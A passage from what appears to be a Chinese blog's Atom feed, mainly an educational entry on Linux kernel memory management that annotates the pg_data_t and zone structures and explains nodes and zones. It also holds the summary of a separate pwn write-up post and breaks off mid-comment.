    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;参考自&lt;a href=&quot;https://xz.aliyun.com/t/12967&quot;&gt;溢出漏洞在异常处理中的攻击利用手法-上&lt;/a&gt;和&lt;a href=&quot;https://xz.aliyun.com/t/12994&quot;&gt;溢出漏洞在异常处理中的攻击利用手法</summary>
      
    
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="https://zjw1nd.github.io/tags/wp/"/>
    
    <category term="chop" scheme="https://zjw1nd.github.io/tags/chop/"/>
    
  </entry>
  
  <entry>
    <title>页表之上——Linux内核的内存管理</title>
    <link href="https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>https://zjw1nd.github.io/2024/10/30/%E9%A1%B5%E8%A1%A8%E4%B9%8B%E4%B8%8A%E2%80%94%E2%80%94Linux%E5%86%85%E6%A0%B8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2024-10-30T11:08:20.000Z</published>
    <updated>2024-11-18T06:43:09.933Z</updated>
    
    <content type="html"><![CDATA[<p>我们都知道，进程内部寻址用的是虚拟地址，虚拟地址要经过mmu被映射到物理地址，进程的页表是独立的等等。但是那么多页表，内核又是怎么调度页表的呢？在我们向内核申请下一个4kb的时候究竟发生了什么？</p><blockquote><p>参考自：<a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I">https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I</a><br>以及一篇更加入门的介绍：<a href="https://cloud.tencent.com/developer/article/1775509">https://cloud.tencent.com/developer/article/1775509</a><br><a href="https://segmentfault.com/a/1190000043626203">https://segmentfault.com/a/1190000043626203</a></p></blockquote><h1>内核视角下的“主存”</h1><p>在内核的视图下，内存自顶向下有3级的管理，依次是节点（node），区（zone）和页（page）或者页框（page frame）。我们从最高（最大）的等级依次向下看。</p><h2 id="什么是节点？">什么是节点？</h2><blockquote><p><a href="https://blog.csdn.net/gatieme/article/details/52384075">https://blog.csdn.net/gatieme/article/details/52384075</a><br>写的很细很好，不再摘抄了，了解节点可以直接点进去看按我看这两篇blog的理解，节点大概就是<strong>物理内存条</strong>， 虽然肯定不是这个意思，但是在抽象的层级上来说，地位大概是物理内存条这一级。这个东西涉及到硬件处理器的设计。一般来讲，对于现代多核CPU访问内存有两种架构，UMA（均匀存储器存取，Uniform-Memory-Access）和NUMA（非均匀存储器存取）。</p></blockquote><p>先说UMA,这种思想就是对于多个CPU, 他们对所有主存都有同样的访问级别，从总线存取的时间等等都基本一样，外围设备也能够共享。大火都一样。</p><p>节点的概念则来自于NUMA架构。简单来讲，虽然每个CPU都能访问全部的物理内存，但是它们访问“自己的”本地存储会更快。我们把这样的本地存储叫做“簇（bank）”，把这些不同的cpu叫做“节点（node）”。而在操作系统内存分配的时候，我们说的节点也就指这些内存簇了。</p><p>LINUX需要的是一种体系无关的内存分配结构，所以它采用了NUMA的节点概念。对于UMA,我们就认为只有一个节点，将他转化成一种伪NUMA的体系进行处理就好了。所以以UMA架构为例的话，节点就是全部的物理存储单元。</p><p>linux使用<code>pg_data_t</code>来描述一个节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The pg_data_t structure is used in machines with CONFIG_DISCONTIGMEM</span></span><br><span class="line"><span class="comment"> * (mostly NUMA machines?) to denote a higher-level memory zone than the</span></span><br><span class="line"><span class="comment"> * zone denotes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * On NUMA machines, each NUMA node would have a pg_data_t to describe</span></span><br><span class="line"><span class="comment"> * it&#x27;s memory layout.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory statistics and page replacement data structures are maintained on a</span></span><br><span class="line"><span class="comment"> * per-zone basis.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/*  包含了结点中各内存域的数据结构 , 可能的区域类型用zone_type表示*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">    <span class="comment">/*  指点了备用结点及其内存域的列表，以便在当前结点没有可用空间时，在备用结点分配内存   */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">    <span class="type">int</span> nr_zones;                                   <span class="comment">/*  保存结点中不同内存域的数目    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP <span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span>      <span class="comment">/*  指向page实例数组的指针，用于描述结点的所有物理内存页，它包含了结点中所有内存域的页。    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_NO_BOOTMEM</span></span><br><span class="line">       <span class="comment">/*  在系统启动boot期间，内存管理子系统初始化之前，</span></span><br><span class="line"><span class="comment">       内核页需要使用内存（另外，还需要保留部分内存用于初始化内存管理子系统）</span></span><br><span class="line"><span class="comment">       为解决这个问题，内核使用了自举内存分配器 </span></span><br><span class="line"><span class="comment">       此结构用于这个阶段的内存管理  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bootmem_data</span> *<span class="title">bdata</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Must be held any time you expect node_start_pfn, node_present_pages</span></span><br><span class="line"><span class="comment">     * or node_spanned_pages stay constant.  Holding this will also</span></span><br><span class="line"><span class="comment">     * guarantee that any pfn_valid() stays that way.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment">     * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">     * 当系统支持内存热插拨时，用于保护本结构中的与节点大小相关的字段。</span></span><br><span class="line"><span class="comment">     * 哪调用node_start_pfn，node_present_pages，node_spanned_pages相关的代码时，需要使用该锁。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* /*起始页面帧号，指出该节点在全局mem_map中的偏移</span></span><br><span class="line"><span class="comment">    系统中所有的页帧是依次编号的，每个页帧的号码都是全局唯一的（不只是结点内唯一）  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* total number of physical pages 结点中页帧的数目 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* total size of physical page range, including holes                     该结点以页帧为单位计算的长度，包含内存空洞 */</span></span><br><span class="line">    <span class="type">int</span> node_id;        <span class="comment">/*  全局结点ID，系统中的NUMA结点都从0开始编号  */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kswapd_wait;      <span class="comment">/*  交换守护进程的等待队列，</span></span><br><span class="line"><span class="comment">    在将页帧换出结点时会用到。后面的文章会详细讨论。    */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>     <span class="comment">/* Protected by  mem_hotplug_begin/end() 指向负责该结点的交换守护进程的task_struct。   */</span></span><br><span class="line">    <span class="type">int</span> kswapd_max_order;                       <span class="comment">/*  定义需要释放的区域的长度  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">classzone_idx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="type">int</span> kcompactd_max_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_classzone_idx</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line">    <span class="comment">/* Lock serializing the migrate rate limiting window */</span></span><br><span class="line">    <span class="type">spinlock_t</span> numabalancing_migrate_lock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_next_window;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of pages migrated during the rate limiting time interval */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> numabalancing_migrate_nr_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment">     * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="type">spinlock_t</span> split_queue_lock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">split_queue</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> split_queue_len;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h2 id="什么是区？">什么是区？</h2><blockquote><p>参考自<a href="https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0">https://www.cnblogs.com/linhaostudy/p/10006723.html#_label0</a><br>上面说道我们每个cpu都有一个节点内存。对于每个节点，又被划分为不同的区。一个管理区域通过struct zone_struct描述, 其被定义为zone_t, 用以表示内存的某个范围, 低端范围的16MB被描述为ZONE_DMA, 某些工业标准体系结构中的(ISA)设备需要用到它, 然后是可直接映射到内核的普通内存域ZONE_NORMAL,最后是超出了内核段的物理地址域ZONE_HIGHMEM, 被称为高端内存（64位已经不用了）.　是系统中预留的可用内存空间, 不能被内核直接映射.</p></blockquote><p>这么大费周章又是要干嘛？其实这三个区都有说法。最低16mb是为了兼容isa总线dma处理器用的（虽然我不知道这是什么），中间能直接线性映射的就直接映射，而对于现代32位x86架构只能寻址4g,很多内存没法直接映射，就又要单独讨论，这么着划分的3个区。</p><p>其实还有其他标记节点内存区的标记：比如ZONE_MOVEABLE, ZONE_DEVICE等这种伪内存区，为了热插拔等等特性所设计，这里不再展开。而现在的AMD64架构已经不再需要高端内存了，128T足够将所有物理内存线性映射到内核</p><blockquote><p>这也成为后面我们要谈的ret2dir攻击手法的开始</p></blockquote><p>最后简单谈谈32位下内核空间1g用户空间3g,超出normal区的高端内存如何访问。按这篇blog来讲，就是临时替换页表，从虚拟地址选一段出来做逻辑地址空间然后临时借用，换掉页表建立映射，用完归还。另外，intel似乎支持一种叫做PAE页表扩展的技术，可以通过扩展一级页表让系统访问更多的内存，这里也不再展开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> watermark[NR_WMARK];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment">     * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment">     * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment">     * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment">     * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment">     * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment">     * changes.</span></span><br><span class="line"><span class="comment">     * 分别为各种内存域指定了若干页</span></span><br><span class="line"><span class="comment">     * 用于一些无论如何都不能失败的关键性内存分配。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The target ratio of ACTIVE_ANON to INACTIVE_ANON pages on</span></span><br><span class="line"><span class="comment">     * this zone&#x27;s LRU.  Maintained by the pageout code.</span></span><br><span class="line"><span class="comment">     * 不活动页的比例,</span></span><br><span class="line"><span class="comment">     * 接着是一些很少使用或者大部分情况下是只读的字段：</span></span><br><span class="line"><span class="comment">     * wait_table wait_table_hash_nr_entries wait_table_bits</span></span><br><span class="line"><span class="comment">     * 形成等待列队，可以等待某一页可供进程使用  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> inactive_ratio;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  指向这个zone所在的pglist_data对象  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>      *<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="comment">/*/这个数组用于实现每个CPU的热/冷页帧列表。内核使用这些列表来保存可用于满足实现的“新鲜”页。但冷热页帧对应的高速缓存状态不同：有些页帧很可能在高速缓存中，因此可以快速访问，故称之为热的；未缓存的页帧与此相对，称之为冷的。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This is a per-zone reserve of pages that are not available</span></span><br><span class="line"><span class="comment">     * to userspace allocations.</span></span><br><span class="line"><span class="comment">     * 每个区域保留的不能被用户空间分配的页面数目</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment">     * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * zone reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_unmapped_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT</span></span><br><span class="line"><span class="comment">     * 只内存域的第一个页帧 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       zone_start_pfn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment">     * holes, which is calculated as:</span></span><br><span class="line"><span class="comment">     *      spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment">     * is calculated as:</span></span><br><span class="line"><span class="comment">     *      present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment">     * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment">     * bootmem allocator):</span></span><br><span class="line"><span class="comment">     *      managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment">     * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment">     * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment">     * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment">     * and thresholds.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Locking rules:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment">     * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment">     * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment">     * quite infrequently.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment">     * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment">     * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment">     * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment">     * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Read access to managed_pages should be safe because it&#x27;s unsigned</span></span><br><span class="line"><span class="comment">     * long. Write access to zone-&gt;managed_pages and totalram_pages are</span></span><br><span class="line"><span class="comment">     * protected by managed_page_count_lock at runtime. Idealy only</span></span><br><span class="line"><span class="comment">     * adjust_managed_page_count() should be used instead of directly</span></span><br><span class="line"><span class="comment">     * touching zone-&gt;managed_pages and totalram_pages.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       managed_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       spanned_pages;             <span class="comment">/*  总页数，包含空洞  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       present_pages;              <span class="comment">/*  可用页数，不包哈空洞  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  指向管理区的传统名字, &quot;DMA&quot;, &quot;NROMAL&quot;或&quot;HIGHMEM&quot; */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment">     * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment">     * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>       nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line">    <span class="type">seqlock_t</span>           span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * wait_table       -- the array holding the hash table</span></span><br><span class="line"><span class="comment">     * wait_table_hash_nr_entries   -- the size of the hash table array</span></span><br><span class="line"><span class="comment"> 